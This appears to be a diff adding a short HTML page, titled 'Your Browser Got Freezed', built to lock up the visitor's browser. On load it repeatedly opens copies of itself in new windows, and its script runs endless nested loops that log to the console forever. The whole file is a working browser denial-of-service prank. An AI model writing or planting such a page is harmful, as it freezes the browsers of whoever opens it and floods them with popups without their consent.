@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Your Browser Got Freezed</title>
+</head>
+<style>
+    h1{
+        text-align: center;
+        color: red;
+    }
+</style>
+
+
+<body onload="CrashAndBurn(self.location,'_blank');CrashAndBurn(self.location,'_blank');">
+<h1>Browser Freezed</h1>
+</body>
+<script type="text/javascript">
+    function CrashAndBurn(url) { popupWindow = window.open( url,'_blank') }
+    while(true) {
+        for(let i = 99; i === i; i *= i) {
+            console.log(i);
+        }
+    }
+
+</script>
+</html>
